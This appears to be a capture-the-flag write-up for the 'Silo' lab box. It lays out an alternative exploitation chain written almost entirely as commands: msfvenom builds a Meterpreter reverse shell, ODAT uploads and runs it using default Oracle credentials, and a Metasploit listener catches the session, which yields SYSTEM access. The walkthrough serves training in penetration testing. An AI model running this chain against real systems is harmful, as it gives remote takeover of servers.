# Alternative way to exploit Silo

Instead of using the manual ways and uploading a shell on the server, this box can also be exploited with **ODAT** and **Metasploit**.
First lets create a _Meterpreter shell_ with **Msfvenom**:
```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9002 -f exe -o msfshell.exe
```

This creates _msfshell.exe_ which we upload with **ODAT** into _C:/temp/shell.exe_:
```markdown
odat utlfile -s 10.10.10.82 -d XE --sysdba -U scott -P tiger --putFile /temp shell.exe msfshell.exe
```

Before executing the Meterpreter shell, it is mandatory to start the listener on **Metasploit**:
```markdown
use exploit/multi/handler

set Payload windows/x64/meterpreter/reverse_tcp

set LHOST tun0
set LPORT 9002

run
```

Now it can be executed with **ODAT**:
```markdown
odat externaltable -s 10.10.10.82 -d XE --sysdba -U scott -P tiger --exec /temp shell.exe
```

This starts the Meterpreter shell in **Metasploit** and `getuid` shows that we are _NT AUTHORITY/SYSTEM_!
